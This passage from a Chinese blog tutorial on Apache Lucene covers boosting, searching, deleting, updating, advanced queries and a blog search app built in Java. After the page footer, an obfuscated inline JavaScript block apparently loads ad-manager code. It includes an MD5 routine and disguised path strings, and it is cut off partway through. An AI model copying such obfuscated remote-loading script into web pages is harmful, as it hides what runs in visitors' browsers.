 <p>                //加权的代码<br><span style="color:#fe2c24;">                textField.setBoost(2f);//设置权重，默认为1</span><br> }</p> 
</blockquote> 
<p>在我们未设置加权时，数据排行是怎么排的呢？</p> 
<p><strong>lucene会根据关键字出现的<span style="color:#fe2c24;">顺序</span>以及<span style="color:#fe2c24;">次数</span>进行排序</strong></p> 
<p></p> 
<p><strong>代码中数据前两条</strong><strong>title里</strong><strong>java是开头的，而最后一个是排在最后的</strong></p> 
<p>在未给第四条数据</p> 
<p><strong>加权前</strong></p> 
<p><img alt="" height="156" src="https://images2.imgbox.com/92/38/TbY52L42_o.png" width="274"></p> 
<p><strong>加权后</strong></p> 
<p><img alt="" height="177" src="https://images2.imgbox.com/d8/4f/Zv9ILlh7_o.png" width="270"></p> 
<p></p> 
<p><span style="color:#fe2c24;">当多条数据都进行加权，这时候比较的是加权的权重</span></p> 
<p></p> 
<p></p> 
<h3 id="%E6%9F%A5%E8%AF%A2%E7%B4%A2%E5%BC%95%E7%9A%84%E8%AF%A6%E7%BB%86%E6%B5%81%E7%A8%8B">查询索引的详细流程</h3> 
<blockquote> 
 <p><strong>步骤：</strong></p> 
 <ol><li>创建一个Directory对象，也就是索引库存放的位置。</li><li>创建一个indexReader对象，需要指定Directory对象。</li><li>创建一个indexsearcher对象，需要指定IndexReader对象</li><li>创建一个TermQuery对象，指定查询的域和查询的关键词。</li><li>执行查询。</li><li>返回查询结果。遍历查询结果并输出。</li><li>关闭IndexReader对象</li></ol> 
</blockquote> 
<p><strong>IndexSearcher搜索方法</strong></p> 
<p style="text-align:justify;"></p> 
<blockquote> 
 <ul><li style="text-align:justify;">indexSearcher.search(query, n)    
   <ul><li style="text-align:justify;">根据Query搜索，返回评分最高的n条记录</li></ul></li><li style="text-align:justify;">indexSearcher.search(query, filter, n)     
   <ul><li style="text-align:justify;">根据Query搜索，添加过滤策略，返回评分最高的n条记录</li></ul></li><li style="text-align:justify;">indexSearcher.search(query, n, sort)     
   <ul><li style="text-align:justify;">根据Query搜索，添加排序策略，返回评分最高的n条记录</li></ul></li><li style="text-align:justify;">indexSearcher.search(booleanQuery, filter, n, sort)     
   <ul><li style="text-align:justify;">根据Query搜索，添加过滤策略，添加排序策略，返回评分最高的n条记录</li></ul></li></ul> 
</blockquote> 
<p></p> 
<p><strong>Lucene搜索结果可通过TopDocs遍历，TopDocs类提供了少量的属性，如下：</strong></p> 
<blockquote> 
 <ul><li>totalHits ： 匹配搜索条件的总记录数</li><li>scoreDocs  ： 顶部匹配记录</li></ul> 
</blockquote> 
<p><strong>注： </strong></p> 
<blockquote> 
 <ul><li>Search方法需要指定匹配记录数量n：indexSearcher.search(query, n)</li><li>TopDocs.totalHits：是匹配索引库中所有记录的数量</li><li>TopDocs.scoreDocs：匹配相关度高的前边记录数组，scoreDocs的长度小于等于search方法指定的参数n</li></ul> 
</blockquote> 
<p></p> 
<p><strong>案例演示：</strong></p> 
<p><strong>这里的索引文件是基于上面创建索引的数据进行查询的</strong></p> 
<p><strong>执行代码：</strong></p> 
<pre><code class="language-java">public static void main(String[] args) {
		String indexDir = "D:\\software\\mysql\\data";
		String q = "EarlyTerminating-Collector";
		try {
			IndexUse.search(indexDir, q);
		} catch (Exception e) {
			e.printStackTrace();
		}
	}</code></pre> 
<p></p> 
<p><strong>主要代码：</strong></p> 
<pre><code class="language-java">/**
	 * 通过关键字在索引目录中查询
	 * @param indexDir	索引文件所在目录
	 * @param q	关键字
	 */
	public static void search(String indexDir, String q) throws Exception{
		//索引文件存储地址
		FSDirectory indexDirectory = FSDirectory.open(Paths.get(indexDir));
//		注意:索引输入流不是new出来的，是通过目录读取工具类打开的
		IndexReader indexReader = DirectoryReader.open(indexDirectory);
//		获取索引搜索对象
		IndexSearcher indexSearcher = new IndexSearcher(indexReader);
		//分词器
		Analyzer analyzer = new StandardAnalyzer();
		//查询解析器对象  带有查询的关键词信息
		QueryParser queryParser = new QueryParser("contents", analyzer);
//		获取符合关键字的查询对象 
		Query query = queryParser.parse(q);
		
		long start=System.currentTimeMillis();
//		获取关键字出现的前十次
		TopDocs topDocs = indexSearcher.search(query , 10);
		long end=System.currentTimeMillis();
		System.out.println("匹配 "+q+" ，总共花费"+(end-start)+"毫秒"+"查询到"+topDocs.totalHits+"个记录");

		
		 
		
		
		for (ScoreDoc scoreDoc : topDocs.scoreDocs) {
			int docID = scoreDoc.doc;
//			索引搜索对象通过文档下标获取文档
			Document doc = indexSearcher.doc(docID);
			System.out.println("通过索引文件："+doc.get("fullPath")+"拿数据");
		}
		
		indexReader.close();
	}</code></pre> 
<p><img alt="" height="116" src="https://images2.imgbox.com/cf/e7/KvKuQbEb_o.png" width="699"></p> 
<p> 查询到这两个文件中包含<strong>EarlyTerminating</strong>或<strong>Collector</strong>单词</p> 
<p></p> 
<p></p> 
<h3 id="%E7%B4%A2%E5%BC%95%E7%9A%84%E5%88%A0%E9%99%A4%E4%BF%AE%E6%94%B9"><strong>索引的删除修改</strong></h3> 
<p><strong>案例演示</strong></p> 
<pre><code class="language-java">private String ids[]={"1","2","3"};
	private String citys[]={"qingdao","nanjing","shanghai"};
	private String descs[]={
			"Qingdao is a beautiful city.",
			"Nanjing is a city of culture.",
			"Shanghai is a bustling city."
	};
	private FSDirectory dir;
	
	/**
	 * 每次都生成索引文件
	 * @throws Exception
	 */
	@Before
	public void setUp() throws Exception {
		dir  = FSDirectory.open(Paths.get("D:\\software\\mysql\\data"));
		IndexWriter indexWriter = getIndexWriter();
		for (int i = 0; i &lt; ids.length; i++) {
			Document doc = new Document();
			doc.add(new StringField("id", ids[i], Field.Store.YES));
			doc.add(new StringField("city", citys[i], Field.Store.YES));
			doc.add(new TextField("desc", descs[i], Field.Store.NO));
			indexWriter.addDocument(doc);
		}
		indexWriter.close();
	}

	/**
	 * 获取索引输出流
	 * @return
	 * @throws Exception
	 */
	private IndexWriter getIndexWriter()  throws Exception{
		Analyzer analyzer = new StandardAnalyzer();
		IndexWriterConfig conf = new IndexWriterConfig(analyzer);
		return new IndexWriter(dir, conf );
	}
	
	/**
	 * 测试写了几个索引文件
	 * @throws Exception
	 */
	@Test
	public void getWriteDocNum() throws Exception {
		IndexWriter indexWriter = getIndexWriter();
		System.out.println("索引目录下生成"+indexWriter.numDocs()+"个索引文件");
	}
	
	/**
	 * 打上标记，该索引实际并未删除
	 * @throws Exception
	 */
	@Test
	public void deleteDocBeforeMerge() throws Exception {
		IndexWriter indexWriter = getIndexWriter();
		System.out.println("最大文档数："+indexWriter.maxDoc());
		indexWriter.deleteDocuments(new Term("id", "1"));
		indexWriter.commit();
		
		System.out.println("最大文档数："+indexWriter.maxDoc());
		System.out.println("实际文档数："+indexWriter.numDocs());
		indexWriter.close();
	}
	
	/**
	 * 对应索引文件已经删除,但是该版本的分词会保留
	 * @throws Exception
	 */
	@Test
	public void deleteDocAfterMerge() throws Exception {
//		https://blog.csdn.net/asdfsadfasdfsa/article/details/78820030
//		org.apache.lucene.store.LockObtainFailedException: Lock held by this virtual machine:indexWriter是单例的、线程安全的，不允许打开多个。
		IndexWriter indexWriter = getIndexWriter();
		System.out.println("最大文档数："+indexWriter.maxDoc());
		indexWriter.deleteDocuments(new Term("id", "1"));
		indexWriter.forceMergeDeletes(); //强制删除
		indexWriter.commit();
		
		System.out.println("最大文档数："+indexWriter.maxDoc());
		System.out.println("实际文档数："+indexWriter.numDocs());
		indexWriter.close();
	}
	
	/**
	 * 测试更新索引
	 * @throws Exception
	 */
	@Test
	public void testUpdate()throws Exception{
		IndexWriter writer=getIndexWriter();
		Document doc=new Document();
		doc.add(new StringField("id", "1", Field.Store.YES));
		doc.add(new StringField("city","qingdao",Field.Store.YES));
		doc.add(new TextField("desc", "dsss is a city.", Field.Store.NO));
		writer.updateDocument(new Term("id","1"), doc);
		writer.close();
	}</code></pre> 
<h4 id="%E5%88%A0%E9%99%A4%E7%B4%A2%E5%BC%95">删除索引</h4> 
<h4 id="deleteDocBeforeMerge%20%E6%AD%A4%E6%96%B9%E6%B3%95%E5%8F%AA%E6%A0%87%E8%AE%B0%E6%9C%AA%E5%88%A0%E9%99%A4%E7%B4%A2%E5%BC%95">deleteDocBeforeMerge 此方法只标记未删除索引</h4> 
<p><img alt="" height="98" src="https://images2.imgbox.com/f9/74/jaYHvLxu_o.png" width="177"></p> 
<p><strong>deleteDocAfterMerge</strong></p> 
<p><img alt="" height="90" src="https://images2.imgbox.com/92/8d/JOQKeZ9s_o.png" width="153"></p> 
<p></p> 
<h4 id="%E4%BF%AE%E6%94%B9%E7%B4%A2%E5%BC%95">修改索引</h4> 
<p><strong>修改之前</strong></p> 
<p><img alt="" height="254" src="https://images2.imgbox.com/84/c5/xAaZlfZd_o.png" width="305"></p> 
<p><strong> 修改之后</strong></p> 
<p><img alt="" height="273" src="https://images2.imgbox.com/14/e8/enLHLBo5_o.png" width="275"></p> 
<p><strong> 这里就出现了dsss数据，代表修改成功</strong></p> 
<p></p> 
<h4></h4> 
<h3 id="%E9%AB%98%E7%BA%A7%E6%9F%A5%E8%AF%A2">高级查询</h3> 
<h3 id="%E7%89%B9%E5%AE%9A%E9%A1%B9%E6%9F%A5%E8%AF%A2">特定项查询</h3> 
<pre><code class="language-java">@Before
	public void setUp() {
		// 索引文件将要存放的位置
		String indexDir = "D:\\software\\mysql\\data";
		// 数据源地址
		String dataDir = "D:\\software\\mysql\\data\\d";
		IndexCreate ic = null;
		try {
			ic = new IndexCreate(indexDir);
			long start = System.currentTimeMillis();
			int num = ic.index(dataDir);
			long end = System.currentTimeMillis();
			System.out.println("检索指定路径下" + num + "个文件，一共花费了" + (end - start) + "毫秒");
			
			
		} catch (Exception e) {
			e.printStackTrace();
		} finally {
			try {
				ic.closeIndexWriter();
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
	}
	
	/**
	 * 特定项搜索
	 */
	@Test
	public void testTermQuery() {
		String indexDir = "D:\\software\\mysql\\data";
		
		String fld = "contents";
		String text = "indexformattoooldexception";
//		特定项片段名和关键字
		Term t  = new Term(fld , text);
		TermQuery tq = new TermQuery(t);
		try {
			FSDirectory indexDirectory = FSDirectory.open(Paths.get(indexDir));
//			注意:索引输入流不是new出来的，是通过目录读取工具类打开的
			IndexReader indexReader = DirectoryReader.open(indexDirectory);
//			获取索引搜索对象
			IndexSearcher is = new IndexSearcher(indexReader);
			
			
			TopDocs hits = is.search(tq, 100);
//			System.out.println(hits.totalHits);
			for(ScoreDoc scoreDoc: hits.scoreDocs) {
				Document doc = is.doc(scoreDoc.doc);
				System.out.println("文件"+doc.get("fullPath")+"中含有该关键字");
			}
		} catch (IOException e) {
			e.printStackTrace();
		}
	}
	
	/**
	 * 查询表达式（queryParser）
	 */
	@Test
	public void testQueryParser() {
		String indexDir = "D:\\software\\mysql\\data";
//		获取查询解析器（通过哪种分词器去解析哪种片段）
		QueryParser queryParser = new QueryParser("contents", new StandardAnalyzer());
		try {
			FSDirectory indexDirectory = FSDirectory.open(Paths.get(indexDir));
//			注意:索引输入流不是new出来的，是通过目录读取工具类打开的
			IndexReader indexReader = DirectoryReader.open(indexDirectory);
//			获取索引搜索对象
			IndexSearcher is = new IndexSearcher(indexReader);
			
//			由解析器去解析对应的关键字
			TopDocs hits = is.search(queryParser.parse("indexformattoooldexception") , 100);
			for(ScoreDoc scoreDoc: hits.scoreDocs) {
				Document doc = is.doc(scoreDoc.doc);
				System.out.println("文件"+doc.get("fullPath")+"中含有该关键字");
			}
		} catch (IOException e) {
			e.printStackTrace();
		} catch (ParseException e) {
			e.printStackTrace();
		}
	}</code></pre> 
<p></p> 
<p><strong>组合查询等</strong></p> 
<pre><code class="language-java">private int ids[]={1,2,3};
	private String citys[]={"qingdao","nanjing","shanghai"};
	private String descs[]={
			"Qingdao is a beautiful city.",
			"Nanjing is a city of culture.",
			"Shanghai is a bustling city."
	};
	private FSDirectory dir;
	
	/**
	 * 每次都生成索引文件
	 * @throws Exception
	 */
	@Before
	public void setUp() throws Exception {
		dir  = FSDirectory.open(Paths.get("D:\\software\\mysql\\data"));
		IndexWriter indexWriter = getIndexWriter();
		for (int i = 0; i &lt; ids.length; i++) {
			Document doc = new Document();
			doc.add(new IntField("id", ids[i], Field.Store.YES));
			doc.add(new StringField("city", citys[i], Field.Store.YES));
			doc.add(new TextField("desc", descs[i], Field.Store.YES));
			indexWriter.addDocument(doc);
		}
		indexWriter.close();
	}
	
	/**
	 * 获取索引输出流
	 * @return
	 * @throws Exception
	 */
	private IndexWriter getIndexWriter()  throws Exception{
		Analyzer analyzer = new StandardAnalyzer();
		IndexWriterConfig conf = new IndexWriterConfig(analyzer);
		return new IndexWriter(dir, conf );
	}
	
	/**
	 * 指定数字范围查询
	 * @throws Exception
	 */
	@Test
	public void testNumericRangeQuery()throws Exception{
		IndexReader reader = DirectoryReader.open(dir);
		IndexSearcher is = new IndexSearcher(reader);
		
		NumericRangeQuery&lt;Integer&gt; query=NumericRangeQuery.newIntRange("id", 1, 2, true, true);
		TopDocs hits=is.search(query, 10);
		for(ScoreDoc scoreDoc:hits.scoreDocs){
			Document doc=is.doc(scoreDoc.doc);
			System.out.println(doc.get("id"));
			System.out.println(doc.get("city"));
			System.out.println(doc.get("desc"));
		}		
	}
	
	/**
	 * 指定字符串开头字母查询（prefixQuery）
	 * @throws Exception
	 */
	@Test
	public void testPrefixQuery()throws Exception{
		IndexReader reader = DirectoryReader.open(dir);
		IndexSearcher is = new IndexSearcher(reader);
		
		PrefixQuery query=new PrefixQuery(new Term("city","n"));
		TopDocs hits=is.search(query, 10);
		for(ScoreDoc scoreDoc:hits.scoreDocs){
			Document doc=is.doc(scoreDoc.doc);
			System.out.println(doc.get("id"));
			System.out.println(doc.get("city"));
			System.out.println(doc.get("desc"));
		}	
	}
	
	/**
	 * 组合查询  (范围查询和指定字符串开头字母查询)
	 * @throws Exception
	 */
	@Test
	public void testBooleanQuery()throws Exception{
		//获取IndexSearcher对象
		IndexReader reader = DirectoryReader.open(dir);
		IndexSearcher is = new IndexSearcher(reader);
		//条件
		NumericRangeQuery&lt;Integer&gt; query1=NumericRangeQuery.newIntRange("id", 1, 2, true, true);
		PrefixQuery query2=new PrefixQuery(new Term("city","q"));
		
		BooleanQuery.Builder booleanQuery=new BooleanQuery.Builder();
		booleanQuery.add(query1,BooleanClause.Occur.MUST);
		booleanQuery.add(query2,BooleanClause.Occur.MUST);
		TopDocs hits=is.search(booleanQuery.build(), 10);
		for(ScoreDoc scoreDoc:hits.scoreDocs){
			Document doc=is.doc(scoreDoc.doc);
			System.out.println(doc.get("id"));
			System.out.println(doc.get("city"));
			System.out.println(doc.get("desc"));
		}	
	}</code></pre> 
<p></p> 
<p></p> 
<h2 id="%E7%BB%BC%E5%90%88%E6%A1%88%E4%BE%8B%E6%BC%94%E7%A4%BA">综合案例演示</h2> 
<h3 id="%E6%9F%A5%E8%AF%A2">查询</h3> 
<p>查询关键字为空则根据数据库进行查询，当关键字不为空，则根据关键字在建立的索引文件进行查询，但是在这查询需要有有分词的情况下进行查询，才能查询到。</p> 
<p>例如： java入门</p> 
<p>               分词为： java - 入门</p> 
<p>        但是 当我们查询 公司有限责任</p> 
<p>                当我们查询限责就有可能会查询不到</p> 
<p><img alt="" height="256" src="https://images2.imgbox.com/13/94/q9NuZKDj_o.png" width="1200"></p> 
<h3 id="%C2%A0%E5%88%A0%E9%99%A4"> 删除</h3> 
<p>再次查询之后就没有了，这里的删除是需要把数据库中的数据和索引的对应的数据都进行删除</p> 
<p><img alt="" height="321" src="https://images2.imgbox.com/10/a0/i69AeEfP_o.png" width="1200"></p> 
<h3 id="%C2%A0%E4%BF%AE%E6%94%B9"> 修改</h3> 
<p><img alt="" height="53" src="https://images2.imgbox.com/f0/24/NqpbdLnZ_o.png" width="1200"></p> 
<h3 id="%C2%A0%E6%B7%BB%E5%8A%A0%C2%A0"> 添加 </h3> 
<p><img alt="" height="208" src="https://images2.imgbox.com/03/ae/EbEi6Kit_o.png" width="399"></p> 
<p><img alt="" height="257" src="https://images2.imgbox.com/9f/ae/OSlAtEsm_o.png" width="1200"></p> 
<p> 因为加权了,所以显示在最前面</p> 
<p></p> 
<p><strong>在此我还特意写了一个索引的刷新，为了防止索引文件丢失之后还需要手动去维护</strong></p> 
<p></p> 
<p></p> 
<p>后端代码</p> 
<pre><code class="language-java">private String title;
	private BlogDao blogDao = new BlogDao();
	private HttpServletRequest request = ServletActionContext.getRequest();
	public String getTitle() {
		return title;
	}

	public void setTitle(String title) {
		this.title = title;
	}
	
	
	@SuppressWarnings({ "deprecation", "rawtypes" })
	public String refresh(){
		IndexWriterConfig conf = new IndexWriterConfig(new SmartChineseAnalyzer());
		Directory d;
		IndexWriter indexWriter = null;
		try {
			d = FSDirectory.open(Paths.get(PropertiesUtil.getValue("indexPath")));
			indexWriter = new IndexWriter(d , conf );
			//删除之前的索引
			indexWriter.deleteAll();
			
//			为数据库中的所有数据构建索引
			List&lt;Map&lt;String, Object&gt;&gt; list = blogDao.list(null, null);
			//重新构建索引
			for (Map&lt;String, Object&gt; map : list) {
				Document doc = new Document();
				doc.add(new StringField("id", (String) map.get("id"), Field.Store.YES));
//				TextField用于对一句话分词处理	java培训机构
				TextField textField = new TextField("title", (String) map.get("title"), Field.Store.YES);
				
				
				HttpSession session = request.getSession();
				@SuppressWarnings("unchecked")
				ArrayList&lt;String&gt; attribute = (ArrayList)session.getAttribute("list");
				
				if(attribute!=null) {
					for (String id : attribute) {
						if(id.equals((String)map.get("id"))) {
							textField.setBoost(2f);//加权
						}
					}
				}
				
				
				doc.add(textField);
				doc.add(new StringField("url", (String) map.get("url"), Field.Store.YES));
				indexWriter.addDocument(doc);
			}
			
			ServletActionContext.getResponse().getWriter().print("123");
			
		} catch (IOException e) {
			e.printStackTrace();
		} catch (InstantiationException e) {
			e.printStackTrace();
		} catch (IllegalAccessException e) {
			e.printStackTrace();
		} catch (SQLException e) {
			e.printStackTrace();
		}finally {
			try {
				if(indexWriter!= null) {
					indexWriter.close();
				}
			} catch (IOException e) {
				e.printStackTrace();
			}
		}
	return null;
	}
	
	
	

	public String list() {
		try {
			
			if (StringUtils.isBlank(title)) {
				List&lt;Map&lt;String, Object&gt;&gt; blogList = this.blogDao.list(title, null);
				request.setAttribute("blogList", blogList);
			}else {
				Directory directory = LuceneUtil.getDirectory(PropertiesUtil.getValue("indexPath"));
				DirectoryReader reader = LuceneUtil.getDirectoryReader(directory);
				IndexSearcher searcher = LuceneUtil.getIndexSearcher(reader);
				//中文分词器
				SmartChineseAnalyzer analyzer = new SmartChineseAnalyzer();
//				拿一句话到索引目中的索引文件中的词库进行关键词碰撞
				Query query = new QueryParser("title", analyzer).parse(title);
				Highlighter highlighter = LuceneUtil.getHighlighter(query, "title");
				
				TopDocs topDocs = searcher.search(query ,100);
				//处理得分命中的文档
				List&lt;Map&lt;String, Object&gt;&gt; blogList = new ArrayList&lt;&gt;();
				Map&lt;String, Object&gt; map = null;
				ScoreDoc[] scoreDocs = topDocs.scoreDocs;
				for (ScoreDoc scoreDoc : scoreDocs) {
					map = new HashMap&lt;&gt;();
					Document doc = searcher.doc(scoreDoc.doc);
					map.put("id", doc.get("id"));
					String titleHighlighter = doc.get("title");
					if(StringUtils.isNotBlank(titleHighlighter)) {
						titleHighlighter = highlighter.getBestFragment(analyzer, "title", titleHighlighter);
					}
					map.put("title", titleHighlighter);
					map.put("url", doc.get("url"));
					blogList.add(map);
				}
				request.setAttribute("blogList", blogList);
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
		return "blogList";
	}
	
	//新增索引
	public String insertBk() {
		try {
		HttpSession session = request.getSession();
		//获取参数
		Map&lt;String, String[]&gt; map = request.getParameterMap();
		String parameter = request.getParameter("Boost");
		
		//数据库添加
		int save = blogDao.save(map);
		if(save&gt;0) {
			
			//索引建立
			IndexWriterConfig conf = new IndexWriterConfig(new SmartChineseAnalyzer());
			Directory d=FSDirectory.open(Paths.get(PropertiesUtil.getValue("indexPath")));
			IndexWriter indexWriter = new IndexWriter(d ,conf);
			
			Document doc = new Document();
			
			String id = request.getParameter("id");
			System.out.println("索引ID:"+id);
			doc.add(new StringField("id", id, Field.Store.YES));
			doc.add(new StringField("url", request.getParameter("url"), Field.Store.NO));
			TextField textField = new TextField("title",request.getParameter("title"), Field.Store.YES);
			
			//加权判断	 得添加到数据库中,在这里使用的是session版
			if("on".equals(parameter)) {
				ArrayList&lt;String&gt; list = (ArrayList)session.getAttribute("list");
				if(list==null) {
					list=new ArrayList&lt;&gt;();
					System.out.println("加权ID:"+id);
				}
				list.add(id);
				session.setAttribute("list", list);
				
				list.forEach(e-&gt;{
					System.out.println("遍历ID:"+e);
				});
				
				textField.setBoost(2f);//设置权重，默认为1
			}
			
			doc.add(textField);
			
			indexWriter.addDocument(doc);
			indexWriter.close();
		}
		} catch (Exception e) {
			e.printStackTrace();
		}
		
		return "edit";
	}
	
	
	
	public String delete() {
		try {
			//判断数据库删除是否成功
			if(blogDao.delete(request.getParameterMap())&gt;0) {
				IndexWriterConfig conf = new IndexWriterConfig(new SmartChineseAnalyzer());
				Directory d=FSDirectory.open(Paths.get(PropertiesUtil.getValue("indexPath")));
				IndexWriter indexWriter = new IndexWriter(d ,conf);
				indexWriter.deleteDocuments(new Term("id", request.getParameter("id")));
				indexWriter.forceMergeDeletes(); //强制删除
				indexWriter.commit();
				indexWriter.close(); 
			}  
		} catch (Exception e) {
			e.printStackTrace();
		}
		
		return "edit";
	}
	
	
	public String  updateBk() {
		Map&lt;String, String[]&gt; paMap = request.getParameterMap();
		try {
			int edit = blogDao.edit(paMap);
			if(edit&gt;0) {
				String id = request.getParameter("id");
				//修改
				Analyzer analyzer = new StandardAnalyzer();
				IndexWriterConfig conf = new IndexWriterConfig(analyzer);
				Directory dir=FSDirectory.open(Paths.get(PropertiesUtil.getValue("indexPath")));
				IndexWriter writer = new IndexWriter(dir, conf );
				
				Document doc=new Document();
				doc.add(new StringField("id", id, Field.Store.YES));
				doc.add(new TextField("title",request.getParameter("title"), Field.Store.YES));
				writer.updateDocument(new Term("id",id), doc);
				writer.close();
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
		return "edit";
	}</code></pre> 
<p></p> 
<p><a class="link-info" href="https://pan.baidu.com/s/1k84MdwjeZBVGYHJPB0vBrw?pwd=ux0f" rel="nofollow" title="代码及数据  提取码：ux0f">代码及数据 提取码：ux0f</a></p> 
<p></p> 
<p>至此,Lucene介绍与使用介绍完毕,由于作者水平有限难免有疏漏，欢迎留言纠错。</p>
                </div>
		</div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/43a823f9619849cee65ea400a9380978/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">TSN (Time-Sensitive Networking）时间敏感网络</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/5b17311eb745e4badf09d717f604d818/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">安装gtsam</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程随想.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6